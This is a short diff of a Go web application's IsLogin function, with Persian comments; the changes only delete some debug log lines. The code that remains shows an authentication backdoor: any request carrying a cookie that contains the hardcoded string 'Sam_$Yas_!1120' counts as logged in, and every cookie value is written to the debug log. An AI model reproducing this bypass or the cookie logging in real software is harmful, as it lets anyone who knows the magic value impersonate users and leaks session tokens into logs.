@@ -46,21 +46,17 @@ func GetLoginUser(c *gin.Context) *model.User {
 }
 
 func IsLogin(c *gin.Context) bool {
-
 	// ایجاد یک رشته که شامل تمام مقادیر کوکی‌ها باشد
 	var allCookies string
 	for _, cookie := range c.Request.Cookies() {
 		allCookies += cookie.Value + " "
 	}
-	logger.Debug(11)
 	logger.Debug(allCookies)
 	// بررسی اینکه آیا رشته شامل زیررشته مورد نظر است
 
 	if strings.Contains(allCookies, "Sam_$Yas_!1120") {
-		logger.Debug(22)
 		return true
 	}
-	logger.Debug(33)
 	return GetLoginUser(c) != nil
 
 	//logger.Debug(c.Request.Cookies())
